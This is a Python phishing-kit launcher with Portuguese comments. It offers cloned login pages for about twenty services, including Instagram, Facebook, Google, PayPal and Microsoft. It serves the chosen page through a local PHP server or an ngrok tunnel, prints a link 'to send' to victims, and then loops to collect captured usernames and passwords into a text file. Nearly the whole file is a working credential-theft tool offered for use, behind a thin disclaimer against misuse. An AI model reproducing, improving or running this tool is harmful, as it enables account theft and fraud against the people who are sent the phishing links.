#----------------------#
import sys
import os
import re
import time
import random
import subprocess
#Tente importar erro
try:
    os.system("clear")
    import requests
except ImportError:
    print("Módulo de solicitações de importação \n pip3 install requests")
except KeyboardInterrupt:
    print("[!] Saindo...")
    sys.exit()


#Defina algum código de cores-----------------------
r ='\033[31;1m'
g ="\033[32;1m"
o ="\033[33;1m"
pu ="\033[35;1m"
c ="\033[36;1m"
y ="\033[93;1m"
w ="\033[0;1m"
p ="\033[95;1m"
#O código de cores termina aqui
#Faça uma função de banner aqui-------------------
def banner():
    print(f"""{g}
             
┈┈┈╱▔▔▔▔▔▔╲┈╭━━━╮┈┈
┈┈▕┈╭━╮╭━╮┈▏┃ CI┃┈┈
┈┈▕┈┃╭╯╰╮┃┈▏╰┳━━╯┈┈
┈┈▕┈╰╯╭╮╰╯┈▏┈┃┈┈┈┈┈
┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈
┈┈▕┈┈┈╰╯┈┈┈▏┈┈┈┈┈┈┈
┈┈▕╱╲╱╲╱╲╱╲▏┈┈┈┈┈┈┈
 V1.02""")
banner()


#A criação do banner termina aqui-------------------------
#Primeiro verifique a conexão com a Internet
def internet(): 
    try:
        res = requests.get("https://google.com")
        if res.status_code == 200:
            print(f"{w}[{c}!{w}] {g} Conexão com a Internet encontrada.\nFaça uma doação: viruscomercial@gmail.com")
        else:
            print(f"{y}[{r}!{y}] {g} Algo deu errado")
    except KeyboardInterrupt:
        print(f"{r}[{c}!{r}] {pu} Saindo de Ravana-----> ")
        sys.exit()
        time.sleep(2)
    except:
        print(f"{r}[{c}!{r}] {y} Por favor, na sua conexão com a internet")

internet()
#A função Internet termina aqui
#Faça um diretório 
def mk_dir():
    try:
        os.makedirs("pweb")
    except FileExistsError:
        print()
    except:
        print(f"{w} ----Algo deu errado------")


mk_dir()
#A função Dir termina aqui
##Make a function for user data---------
def user_data(server):
    while True:
        if  os.path.exists(f"pweb/{server}/userlog.txt"):
            print(f"{w}[{g}+{w}] {y} Dados do usuário encontrados")
            os.system(f"cat pweb/{server}/userlog.txt")
            os.system(f"cat pweb/{server}/userlog.txt >> Vl.txt")
            print()
            print(f"{y}[{g}+{y}] {r} O nome de usuário e senha estão salvos em vl.txt")
            os.system(f"rm -rf pweb/{server}/userlog.txt")
        else:
            pass



#Faça uma função para lidar com Localhost
def l_host(server):
    path = f"sites/{server}"
    des = "pweb/"
    os.system(f"cp -R {path} {des}")
    print("\n")
    print(f"{r}[{w}~{r}] {g} Selecione uma opção ")
    print()
    print(f"{y}[{g}01{y}] {r} Localhost--Random--")
    print(f"{y}[{g}02{y}] {r} Localhost--Custom--")
    port_ = random.randint(1150, 9999)
    l_optn = input(f"{y}[{g}~{y}] {w} Escolha a opção: ")
    if l_optn == "1" or l_optn == "01":
        os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
        print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}\n\n\nNÃO ME RESPONSABILIZO PELO MAL USO, SE NÃO FUNCIONAR SIGNIFICA QUE A API CAIU:)")
        user_data(server)
    if l_optn == "2" or l_optn == "02":
        print()
        port_ = int(input(f"{r}[{g}+{r}] {y} Enter a portnumber: "))
        os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
        print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}")
        user_data(server)
#Faça um host ngrok
def ngrok_s(server):
    try:
        path = f"sites/{server}"
        des = "pweb/"
        os.system(f"cp -R {path} {des}")
        print("\n")
        port_ = random.randint(1150, 9999)
        os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
        os.system(f"./ngrok http http://127.0.0.1:{port_} > /dev/null 2>&1 & sleep 8")
        os.system(f'echo -ne "Send this link: "')
        os.system(f'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
        user_data(server)
    except:
        print()
        print(f"{r} _______{g}Saindo de Crackinsta{r}______")
        time.sleep(2)
        sys.exit(1)



#Solicitando opção de troca de link
def host_optn(server):
    print("\n")
    print(f"{p}[{g}~{p}] {w} Opção de geração de link\nFaça uma doação: viruscomercial@gmail.com")
    print()
    print(f"{w}[{y}01{w}] {g} Localhost")
    print()
    h_optn = input(f"{r}[{w}×{r}] {y} Escolha uma opção:\nFaça uma doação: viruscomercial@gmail.com ")
    if h_optn == "1" or h_optn == "01":
        l_host(server)
    elif h_optn == "2" or h_optn == "02":
        ngrok_s(server)
    
#fazer opções para sites..
def optn():
    print(f"{y}[{g}01{y}] {c} Instagram     {y}[{g}11{y}] {c} Dropbox ")
    print(f"{y}[{g}02{y}] {c} Facebook      {y}[{g}12{y}] {c} ig_follower ")
    print(f"{y}[{g}03{y}] {c} Google        {y}[{g}13{y}] {c} Yandex ")
    print(f"{y}[{g}04{y}] {c} Twitter       {y}[{g}14{y}] {c} Origin ")
    print(f"{y}[{g}05{y}] {c} Netflix       {y}[{g}15{y}] {c} Ebay  ")
    print(f"{y}[{g}06{y}] {c} Snapchat      {y}[{g}16{y}] {c} Pinetrest ")
    print(f"{y}[{g}07{y}] {c} Yahoo         {y}[{g}17{y}] {c} Linkdin ")
    print(f"{y}[{g}08{y}] {c} Github        {y}[{g}18{y}] {c} Ebay ")
    print(f"{y}[{g}09{y}] {c} Paypal        {y}[{g}19{y}] {c} Microsoft  ")
    print(f"{y}[{g}10{y}] {c} Spotify       {y}[{g}20{y}] {c} About me ")

optn()
#Vamos ler a entrada do usuário----------
print("\n")
try:
    optn = input(f"{w}[{g}×{w}] {p} Escolha uma opção:\nFaça uma doação: viruscomercial@gmail.com ")
except KeyboardInterrupt:
    print(f"{g}[{y}!{g}] {r} ___Saindo de Crackinsta___")
    time.sleep(1)
    sys.exit()
# Criar identificador para entrada do usuário----------------
if optn == '1' or optn == '01':
    host_optn("instagram")
elif optn == '2' or optn == '02':
    host_optn("facebook")
elif optn == '3' or optn == '03':                           host_optn("google")
elif optn == '4' or optn == '04':
    host_optn("twitter")
elif optn == '5' or optn == '05':                           host_optn("netflix")
elif optn == '6' or optn == '06':                           host_optn("snapchat")
elif optn == '7' or optn == '07':                           host_optn("yahoo")
elif optn == '8' or optn == '08':                           host_optn("github")
elif optn == '9' or optn == '09':                           host_optn("paypal")
elif optn == '10':
    host_optn("spotify")
elif optn == '11':                                          host_optn("dropbox")
elif optn == '12':                                          host_optn("ig_follower")
elif optn == '13':                                          host_optn("yandex")
elif optn == '14':                                          host_optn("origin")
elif optn == '15':                                          host_optn("ebay")
elif optn == '16':                                          host_optn("pinetrest") 
elif optn == '17':                                          host_optn("linkedin")
elif optn == '18':                                          host_optn("snapchat")
elif optn == '19':                                          host_optn("microsoft")
elif optn == '20':                                          print(f"{y} Eu sou o vírus e sou engenheiro m \n{r} Youtube https://m.youtube.com/c/pqpvirus\n{c} Instagram https://instagram.com/sirprincekrvert\n{p} Facebook https://m.facebook.com/Princekrvert") 
else:
    print("\n")
    print(f"{r}[{y}!{r}] {g} Invalid option ")
    time.sleep(1)
    sys.exit()
